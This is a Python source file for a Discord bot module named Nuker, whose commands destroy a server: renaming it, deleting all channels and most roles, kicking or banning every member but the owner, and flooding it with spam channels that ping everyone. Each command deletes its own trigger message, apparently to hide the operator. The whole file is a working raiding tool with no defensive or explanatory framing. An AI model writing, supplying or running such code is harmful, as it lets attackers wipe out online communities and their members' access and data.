# cogs/nuker.py
import asyncio
import discord
from discord.ext import commands

class Nuker(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="nuke")
    async def nuke(self, ctx):
        await ctx.message.delete()
        g = ctx.guild
        if not g:
            return
        try:
            await g.edit(name="NUKED")
        except Exception:
            pass
        # channels
        for ch in list(g.channels):
            try:
                await ch.delete()
            except Exception:
                pass
            await asyncio.sleep(0.25)
        # roles
        for role in list(g.roles):
            if role.is_default() or role >= g.me.top_role:
                continue
            try:
                await role.delete()
            except Exception:
                pass
            await asyncio.sleep(0.25)
        # kick
        for m in list(g.members):
            if m == g.me or m == g.owner:
                continue
            try:
                await m.kick(reason="nuked")
            except Exception:
                pass
            await asyncio.sleep(0.2)
        # spam channels
        for i in range(15):
            try:
                ch = await g.create_text_channel(f"nuked-{i}")
                await ch.send("@everyone nuked")
            except Exception:
                pass
            await asyncio.sleep(0.3)
        print(f"[NUKE] done {g.id}")

    @commands.command(name="masschannel")
    async def masschannel(self, ctx, count: int = 40, *, name: str = "nuked"):
        await ctx.message.delete()
        for i in range(count):
            try:
                await ctx.guild.create_text_channel(f"{name}-{i}")
            except Exception:
                pass
            await asyncio.sleep(0.2)

    @commands.command(name="massrole")
    async def massrole(self, ctx, count: int = 40, *, name: str = "nuked"):
        await ctx.message.delete()
        for i in range(count):
            try:
                await ctx.guild.create_role(name=f"{name}-{i}")
            except Exception:
                pass
            await asyncio.sleep(0.2)

    @commands.command(name="banall")
    async def banall(self, ctx):
        await ctx.message.delete()
        for m in list(ctx.guild.members):
            if m == ctx.guild.me or m == ctx.guild.owner:
                continue
            try:
                await m.ban(reason="nuked")
            except Exception:
                pass
            await asyncio.sleep(0.25)

    @commands.command(name="kickall")
    async def kickall(self, ctx):
        await ctx.message.delete()
        for m in list(ctx.guild.members):
            if m == ctx.guild.me or m == ctx.guild.owner:
                continue
            try:
                await m.kick(reason="nuked")
            except Exception:
                pass
            await asyncio.sleep(0.25)

async def setup(bot):
    await bot.add_cog(Nuker(bot))
